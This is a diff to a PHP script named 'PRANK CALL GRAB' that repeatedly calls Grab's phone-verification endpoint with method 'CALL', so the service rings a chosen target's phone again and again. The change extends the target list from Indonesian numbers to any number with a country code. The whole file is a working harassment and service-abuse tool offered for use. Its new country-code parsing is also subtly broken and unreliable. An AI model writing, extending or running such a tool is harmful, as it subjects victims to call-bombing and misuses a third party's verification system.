@@ -1,21 +1,30 @@
 <?php
-function get_input(){
+function get_input() {
     return trim(fgets(STDIN));
 }
 
 class PrankCall {
     private $number;
     private $headers = [];
-    
+
     public function __construct($no) {
         $this->number = $this->validate_number($no);
     }
 
     private function validate_number($no) {
-        $no = preg_replace('/[^0-9]/', '', $no);
-        if (substr($no, 0, 1) == '0') {
-            $no = '62' . substr($no, 1);
+        // إزالة أي أحرف غير رقمية
+        $no = preg_replace('/[^0-9+]/', '', $no);
+
+        // التحقق من وجود رمز الدولة (+)
+        if (substr($no, 0, 1) !== '+') {
+            die("Error: Please include the country code with a '+' sign (e.g., +62 for Indonesia).\n");
         }
+
+        // التحقق من صحة الرقم
+        if (strlen($no) < 8) {
+            die("Error: Invalid phone number.\n");
+        }
+
         return $no;
     }
 
@@ -44,15 +53,15 @@ class PrankCall {
 
     public function send_otp() {
         $ch = curl_init();
-        
+
         curl_setopt_array($ch, [
             CURLOPT_URL => 'https://api.grab.com/grabid/v2/phone/otp',
             CURLOPT_RETURNTRANSFER => true,
             CURLOPT_POST => true,
             CURLOPT_POSTFIELDS => http_build_query([
                 'method' => 'CALL',
-                'countryCode' => 'ID',
-                'phoneNumber' => $this->number,
+                'countryCode' => substr($this->number, 1, 2), // استخراج رمز الدولة
+                'phoneNumber' => substr($this->number, 3),    // استخراج الرقم بدون رمز الدولة
                 'templateID' => 'pax_android_production'
             ]),
             CURLOPT_HTTPHEADER => $this->generate_headers(),
@@ -64,6 +73,7 @@ class PrankCall {
         $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
         curl_close($ch);
 
+        // التحقق من النجاح بناءً على الرد
         return ($http_code == 200 && strpos($response, 'challengeID') !== false);
     }
 
@@ -75,19 +85,19 @@ class PrankCall {
         while ($count == 0 || $attempt < $count) {
             $success = $this->send_otp();
             $attempt++;
-            
-            echo "[" . date('H:i:s') . "] Percobaan ke-$attempt: " . ($success ? 'Sukses' : 'Gagal') . PHP_EOL;
-            
-            if($count != 0 && $attempt >= $count) break;
-            sleep(rand(1, 3));
+
+            echo "[" . date('H:i:s') . "] Percobaan ke-$attempt: " . ($success ? 'Sukses (Panggilan berhasil dikirim!)' : 'Gagal (Tidak ada panggilan)') . PHP_EOL;
+
+            if ($count != 0 && $attempt >= $count) break;
+            sleep(rand(1, 3)); // تأخير بين المحاولات
         }
-        
+
         echo "Proses selesai!" . PHP_EOL;
     }
 }
 
 echo "########## PRANK CALL GRAB ##########\n";
-echo "Nomor Target (contoh: 08123456789): ";
+echo "Nomor Target (contoh: +628123456789): ";
 $number = get_input();
 
 $prank = new PrankCall($number);
